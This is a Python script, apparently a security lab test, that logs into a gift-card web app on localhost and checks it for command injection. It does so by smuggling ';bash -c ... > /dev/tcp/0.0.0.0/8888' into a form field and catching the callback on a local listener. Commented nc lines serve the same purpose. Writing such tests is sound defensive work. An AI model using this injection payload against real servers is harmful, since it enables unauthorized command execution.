import requests
#from subprocess import Popen,PIPE
import socket
from time import sleep
pyListener = socket.socket()
pyListener.settimeout(2)
pyListener.bind(('localhost', 8888))
pyListener.listen()

# Fill in your details here to be posted to the login form.
payload = {
    'uname': 'john',
    'pword': 'johnpass'
}
payload2 = {
    'card_supplied': 'True',
    'card_fname': ';bash -c " echo -n pwned > /dev/tcp/0.0.0.0/8888 0<&1 2>&1";'
}
#127.0.0.1:80
#echo helloe | nc 10.0.2.15 8888
from subprocess import Popen, PIPE
#ncListener = Popen(['nc', '-nvlp', '8888'], shell=False, stdout=PIPE)

def cookit(s): 
    for i in s.cookies:
        if i.name == "sessionid":
            return i

# Use 'with' to ensure the session context is closed after use.
with requests.Session() as s:
    s.post('http://127.0.0.1/login.html', data = payload)
    sessioncookie=cookit(s)
    sessioncookie.secure = False
    # An authorised request.
    s.get('http://127.0.0.1/useCard.html')
    a_files = {'card_data': open('jbg469-cmdi.gftcrd', 'rb')}
    s.post("http://127.0.0.1/useCard.html", data=payload2, files=a_files)

try:
    connection, address = pyListener.accept()
    sleep(3) # Probably not necessary, but may be useful
    output = connection.recv(1024).decode()
    print(output)
    #ncOutput = ncListener.communicate(timeout=3)[0].decode('utf-8')
    if (output == 'pwned'):
        print("Vulnerable to CMDI")
except: 
    print("Not vulnerable to CMDi")
finally:
    pyListener.close()
   

